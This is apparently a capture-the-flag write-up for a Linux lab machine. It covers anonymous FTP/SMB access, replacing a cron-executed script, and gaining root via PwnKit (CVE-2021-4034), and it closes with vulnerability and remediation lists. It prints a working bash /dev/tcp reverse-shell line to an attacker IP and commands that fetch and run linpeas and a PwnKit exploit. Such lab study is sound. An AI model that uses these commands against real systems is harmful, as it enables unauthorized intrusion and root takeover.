## Anonymous

Linux machine exploitation through FTP/SMB anonymous access, cron job manipulation, and pkexec privilege escalation vulnerability (CVE-2021-4034).

**Target:** 10.49.171.176 (anonymous)  
**Attack Vector:** FTP Access → Script Manipulation → RCE → PwnKit Exploitation  
**Difficulty:** Intermediate  

---

### RECONNAISSANCE

**Port Enumeration**

```
21/tcp   FTP         vsftpd 3.0.3 (anonymous login allowed)
22/tcp   SSH         OpenSSH 7.6p1 Ubuntu
139/tcp  NetBIOS     Samba 4.7.6
445/tcp  SMB         Samba 4.7.6 (guest access enabled)
```

**Service Analysis**

FTP allows anonymous login with writable scripts directory. SMB shares accessible without authentication. Both services configured with weak security posture.

---

### ENUMERATION PHASE

**FTP ACCESS**

```
ftp 10.49.171.176
Name: anonymous
Password: [blank]
Connected → /var/ftp/scripts directory
```

**FTP DIRECTORY LISTING**

```
clean.sh              (executable bash script)
removed_files.log     (script output log)
to_do.txt             (task list)
```

**SCRIPT ANALYSIS**

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script: nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
    done
fi
```

Script executes automatically (cron job). Logic flaw: `$tmp_files=0` evaluates as string comparison, not integer. Script executed periodically with elevated privileges.

**SMB ENUMERATION**

```
enum4linux -a 10.49.171.176
```

Shares discovered:
```
IPC$       IPC Service
pics       My SMB Share Directory for Pics (readable)
print$     Printer Drivers
```

**SMB SHARE ACCESS**

```
smbclient //10.49.171.176/pics -N
```

Contents:
```
corgo2.jpg   (42 KB image)
puppos.jpeg  (265 KB image)
```

Image files downloaded for steganography analysis. Standard rabbit hole—images contain no hidden data or credentials.

---

### EXPLOITATION

**FTP SCRIPT REPLACEMENT**

The writable `/var/ftp/scripts/` directory and cron execution enable direct RCE.

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.158.30/4444 0>&1
```

Replace legitimate clean.sh with reverse shell payload.

**UPLOAD MALICIOUS SCRIPT**

```
ftp 10.49.171.176
cd scripts
put clean.sh
```

File uploaded to FTP directory. Cron job executes at regular interval.

**REVERSE SHELL ESTABLISHMENT**

```
rlwrap nc -lvnp 4444
```

Listener established. Script execution triggers incoming connection.

```
connect to [192.168.158.30] from (UNKNOWN) [10.49.171.176] 48596
namelessone@anonymous:~$
```

Initial access as `namelessone` user via cron-executed script.

**USER FLAG**

```
cat user.txt
[flag obtained]
```

---

### PRIVILEGE ESCALATION

**LINPEAS ANALYSIS**

```
wget http://192.168.158.30/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Linpeas output identifies critical vulnerability:

```
Polkit Binary (CVE-2021-4034 - PwnKit)
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!

-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
pkexec version 0.105
Potentially vulnerable to CVE-2021-4034 (PwnKit)
```

**CVE-2021-4034 VULNERABILITY ANALYSIS**

PwnKit exploits heap overflow in pkexec argument parsing. Vulnerability exists in versions before 0.106.

Attack mechanism:
- Craft malicious environment variables
- Trigger buffer overflow during argument processing
- Execute arbitrary code as root

Vulnerability requires no authentication—any local user can exploit.

**PWNKIT EXPLOITATION**

```
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit
```

Exploit executes automatically. Spawns root shell.

**PRIVILEGE ESCALATION VERIFICATION**

```
id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(namelessone)
```

User namelessone now executes as root (uid=0). Full system compromise achieved.

**SYSTEM FLAG**

```
cat /root/root.txt
[flag obtained]
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port enumeration
  ├─ Service version detection
  └─ Anonymous access verification

PHASE 2: FTP Enumeration
  ├─ Anonymous FTP login
  ├─ Directory listing (/var/ftp/scripts)
  ├─ Script analysis (clean.sh)
  └─ Cron job identification

PHASE 3: SMB Enumeration
  ├─ Share listing (pics, print$, IPC$)
  ├─ Anonymous share access
  ├─ File download (images)
  └─ Steganography analysis (rabbit hole)

PHASE 4: Initial Access
  ├─ Malicious script creation
  ├─ FTP upload to scripts directory
  ├─ Cron execution trigger
  ├─ Reverse shell connection
  └─ User shell establishment

PHASE 5: Privilege Escalation
  ├─ Linpeas download and execution
  ├─ CVE-2021-4034 identification
  ├─ PwnKit exploit download
  ├─ Exploit execution
  └─ Root shell spawning
```

---

### VULNERABILITIES

**CRITICAL ISSUES**

1. **FTP Anonymous Writable Directory (CVSS 8.2)**
   - `/var/ftp/scripts/` accessible to anonymous users
   - Directory contains executable scripts
   - No access controls on write operations

2. **Unvalidated Cron Execution (CVSS 8.8)**
   - Scripts in FTP directory executed automatically
   - No integrity verification on script contents
   - Privilege escalation to script execution user

3. **CVE-2021-4034 - PwnKit (CVSS 7.8)**
   - Pkexec 0.105 vulnerable to heap overflow
   - Any local user can escalate to root
   - Requires no authentication
   - Patch available (version 0.106+)

4. **Image File Exposure (CVSS 5.3)**
   - SMB share contains user/system files
   - Anonymous access granted
   - Information disclosure risk

---

### REMEDIATION

```
IMPLEMENT:
├─ FTP Hardening
│  ├─ Disable anonymous write access
│  ├─ Remove execute permissions on scripts directory
│  ├─ Implement strict file permissions (640)
│  └─ Monitor FTP upload activity
│
├─ Cron Security
│  ├─ Implement script integrity verification (checksums)
│  ├─ Use immutable file attributes
│  ├─ Restrict cron execution context
│  └─ Alert on script modification
│
├─ Privilege Escalation
│  ├─ Update pkexec to 0.106+ (patched)
│  ├─ Restrict pkexec configuration
│  ├─ Monitor sudo/pkexec execution
│  └─ Implement SELinux policies
│
├─ SMB Access Control
│  ├─ Disable anonymous shares
│  ├─ Implement share-level permissions
│  ├─ Require authentication for all access
│  └─ Remove sensitive file shares
│
└─ Detection & Monitoring
   ├─ Alert on FTP anonymous uploads
   ├─ Monitor cron job execution
   ├─ Track pkexec privilege escalation attempts
   └─ Implement file integrity monitoring (AIDE/Tripwire)
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port enumeration)
- ftp (anonymous access)
- smbclient (SMB enumeration)
- enum4linux (SMB enumeration)
- linpeas (privilege escalation scanning)
- PwnKit (CVE-2021-4034 exploitation)

**Attack Complexity:** Low-Medium  
**Exploitation Duration:** 45-60 minutes  
**Key Insight:** FTP writable directory + cron execution = direct RCE path

**Privilege Escalation Path:**
- Initial access as standard user (namelessone)
- Linpeas identifies unpatched pkexec
- PwnKit exploit leverages heap overflow
- Root shell achieved without password requirement

  **JAI SHRI RAM**
